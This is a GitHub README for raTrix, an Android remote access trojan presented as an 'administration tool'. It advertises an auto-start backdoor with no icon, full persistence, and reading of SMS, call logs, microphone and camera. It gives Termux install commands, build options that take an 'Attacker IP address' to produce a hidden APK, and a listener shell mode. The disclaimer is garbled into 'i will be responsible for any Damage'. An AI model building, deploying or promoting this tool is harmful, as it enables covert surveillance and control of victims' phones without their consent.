<img src="https://github.com/MrpasswordTz/raTrix/blob/main/images/2.jpg" alt= 'ratrix picture' >

# raTrix
raTrix is a powerful Android administration tool designed for Linux systems. It utilizes Python on the client-side and Java on the server-side to provide a robust and efficient management solution.

# FEATURE FOR raTrix
<ul>
  <li>light apk</li>
  <li>shell and build mode</li>
  <li>it run background 24hrs</li>
  <li>it show device info,MAC Adress, device ip, simcard info</li>
  <li>Auto start backdoor</li>
  <li>sms viewing and callLogs viewing</li>
  <li>microphone checking</li>
  <li>camera checking</li>
  <li>full persistent</li>
  <li>Easy To use</li>
  <li>no icon</li>
</ul>

 # installation on termux
```
pkg update
pkg upgrade
pkg install git
pkg install python python2 python3
pkg install openjdk-17
pkg install aapt
git clone https://github.com/MrpasswordTz/raTrix.git
cd raTrix
pip install -r requirements.txt 
```
# usages building mode
```
python3 raTrix.py --build [models]
modules:
 -i, --ip                Attacker IP address (required)
    -p, --port              Attacker port number (required)
    -o, --output            Name for the apk file (optional)
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
```
# Usages SHELL mode
```
Usage:
  python3 androRAT.py --shell [modules]
  modules:
    -i, --ip                Listner IP address
    -p, --port              Listner port number
```
# Disclaimer
This tool is only for educational purposes, i will be responsible for any Damage
